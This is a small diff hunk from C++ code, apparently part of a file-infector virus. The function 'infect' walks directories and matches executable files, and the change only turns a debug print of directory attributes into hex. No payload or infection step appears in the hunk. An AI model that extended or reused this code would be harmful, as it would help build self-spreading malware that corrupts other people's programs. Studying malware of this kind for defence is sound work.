@@ -228,7 +228,7 @@ int infect(void)
                search_stack = reinterpret_cast<char **>(realloc(search_stack, sizeof(char *) * search_stack_size));
             
             search_stack[search_stack_size-1] = new_directory;
-            std::wcout << "\t\tIs a directory " << find_data.dwFileAttributes << std::endl;
+            std::wcout << "\t\tIs a directory " << std::hex << find_data.dwFileAttributes << std::endl;
          }
          else if (strnicmp(find_data.cFileName+(strlen(find_data.cFileName)-4), exeSearch, strlen(exeSearch)) == 0)
          {
